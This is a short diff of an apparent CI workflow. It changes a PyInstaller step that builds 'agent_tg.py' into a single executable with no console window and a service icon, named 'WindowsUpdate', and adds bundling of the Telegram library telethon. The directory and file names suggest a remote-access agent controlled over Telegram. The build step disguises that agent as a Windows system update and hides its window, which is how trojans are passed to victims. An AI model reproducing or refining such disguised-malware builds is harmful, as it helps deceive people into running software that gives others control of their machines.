@@ -27,7 +27,7 @@ jobs:
 
       - name: Build EXE
         working-directory: decrat2
-        run: pyinstaller --onefile --noconsole --icon=service.ico --name="WindowsUpdate" agent_tg.py
+        run: pyinstaller --onefile --noconsole --icon=service.ico --collect-all telethon --name="WindowsUpdate" agent_tg.py
 
       - name: Get short SHA
         id: sha
